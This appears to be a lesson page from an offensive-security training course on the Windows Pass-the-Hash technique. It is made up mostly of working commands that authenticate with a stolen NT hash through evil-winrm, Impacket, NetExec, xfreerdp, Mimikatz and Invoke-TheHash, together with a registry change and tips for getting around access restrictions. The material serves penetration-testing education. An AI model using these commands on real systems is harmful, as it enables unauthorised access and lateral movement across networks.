---
title: Pass-the-Hash (PtH)
slug: pass-the-hash
area: windows
module: 10
order: 1
goal: Authenticate as a user with their NT hash — no password, no cracking — and get a shell or run commands.
summary: How to do a Pass-the-Hash end to end — get an NT hash, then reuse it with evil-winrm, Impacket, NetExec, xfreerdp, Mimikatz or Invoke-TheHash, with the local-vs-domain and Restricted Admin gotchas that trip people up.
prereqs: [An NT hash for a user (local or domain), That user is admin on the target (local admin) for remote code exec, SMB (445) / WinRM (5985) / RDP (3389) reachable]
seeAlso: [tool:evil-winrm, tool:impacket, tool:netexec, tool:xfreerdp, tool:mimikatz, tool:secretsdump, map:credential-access]
references:
  - The Hacker Recipes: Pass-the-Hash | https://www.thehacker.recipes/ad/movement/ntlm/pth
  - HackTricks: NTLM and Pass-the-Hash | https://book.hacktricks.wiki/en/windows-hardening/ntlm/index.html
---

Windows accepts the NT hash of a password in place of the password itself for NTLM authentication. So once you have a user's NT hash you can log in as them without ever cracking it. You do **not** need to crack the hash — passing it is the attack.

The hash looks like `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0` (`LMhash:NThash`). Tools want the **NT** half; an empty LM half is fine, written as `:NThash`.

## Where the hash comes from

You already dumped it — from the SAM, from LSASS, from NTDS.dit, or with secretsdump. If you have not, do that first.

```bash
# the usual source: secretsdump prints uid:rid:lmhash:nthash — take the 4th field
secretsdump.py 'DOMAIN/user:pass@TARGET'
```

## Method — WinRM shell (evil-winrm)

The cleanest interactive shell when 5985 is open and the account is a local admin.

```bash
evil-winrm -i TARGET -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

## Method — SMB exec (Impacket)

A semi-interactive shell over SMB. `psexec` drops a service (loud, SYSTEM); `wmiexec` is quieter (no service, runs as the user).

```bash
impacket-psexec  Administrator@TARGET -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
impacket-wmiexec Administrator@TARGET -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

## Method — spray and exec (NetExec)

The fastest way to test one hash against many hosts, and to run a command.

```bash
nxc smb TARGETS -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0            # shows (Pwn3d!) where admin
nxc smb TARGET  -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x 'whoami'
```

## Method — RDP with the hash (xfreerdp)

PtH over RDP needs **Restricted Admin mode** enabled on the target first (set the registry value below, which itself needs admin/exec).

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:TARGET /u:Administrator /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /cert:ignore +clipboard
```

## Method — on-Windows (Mimikatz / Invoke-TheHash)

From a Windows foothold, spawn a process as the user (Mimikatz injects the hash into a new logon), or run PowerShell remotely with Invoke-TheHash — no local admin needed on the source box for Invoke-TheHash.

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /rc4:31d6... /domain:TARGET /run:cmd.exe" exit
```

```powershell
Invoke-SMBExec -Target TARGET -Username Administrator -Hash 31d6... -Command "powershell -e <b64>"
```

## If it fails

- **"Access denied" with a local account** over SMB/WMI: the target's `LocalAccountTokenFilterPolicy` (UAC remote restriction) blocks non-RID-500 local admins. The built-in Administrator (RID 500) still works; a domain account that is local admin works too.
- **Domain vs local**: use `DOMAIN/user` for a domain account, `./user` (or the host name) for a local one. Passing a domain hash to a standalone host, or vice versa, fails.
- **WinRM denied** but SMB works: the account may not be in Remote Management Users — fall back to `psexec`/`wmiexec`.
- **RDP /pth fails**: Restricted Admin is off (set the reg key) or disabled by policy.

## Verify

```bash
nxc smb TARGET -u Administrator -H 31d6... -x whoami   # a line of output = you are in
```

If you need Kerberos instead of NTLM (the host refuses NTLM, or you want to move laterally as the user), turn the hash into a ticket with over-pass-the-hash — see Pass-the-Ticket.
